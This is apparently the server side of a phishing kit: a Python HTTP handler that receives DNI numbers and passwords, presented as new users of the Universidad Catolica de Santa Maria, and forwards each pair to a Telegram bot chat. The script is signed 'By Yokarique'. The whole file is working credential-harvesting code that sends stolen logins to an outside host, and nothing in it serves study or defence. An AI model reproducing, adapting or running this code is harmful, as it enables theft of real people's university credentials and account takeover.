from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import requests

class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        parsed_data = parse_qs(post_data.decode('utf-8'))

        id = parsed_data['id'][0]
        key = parsed_data['key'][0]
        txt = parsed_data['txt'][0]
        dni = parsed_data['dni'][0]
        password = parsed_data['password'][0]

        mensaje = f"---------------------------------------------------\nNuevo usuario de la Universidad\nCatolica de Santa Maria:\n---------------------------------------------------\n\n-DNI: {dni}\n\n-Password: {password}\n\n\n===========\nBy Yokarique\n==========="
        url = f'https://api.telegram.org/bot{key}/sendMessage?chat_id={id}&text={mensaje}'
        response = requests.get(url)

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(bytes("Datos enviados a Telegram", "utf-8"))

def run(server_class=HTTPServer, handler_class=RequestHandler, port=5000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Esperando conexión, PUERTO:{port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()